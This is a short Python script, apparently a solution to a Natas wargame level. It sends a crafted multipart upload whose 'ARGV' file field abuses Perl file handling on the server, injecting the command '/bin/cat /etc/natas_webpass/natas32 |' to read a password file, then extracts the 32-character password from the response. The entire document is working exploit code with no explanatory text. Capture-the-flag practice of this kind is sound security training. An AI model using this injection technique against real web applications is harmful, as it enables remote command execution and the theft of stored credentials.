import config
import os, re, base64
from requests import *
from urllib import quote

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

files = [("file", ("", "ARGV")), ("file", ("test.csv", "test"))]
cmd = quote("/bin/cat /etc/natas_webpass/natas32 |")

response = post(url + "?" + cmd, auth=(user, password), files=files)

password = re.findall(r"\w{32}", response.content)[-1]

print(password)
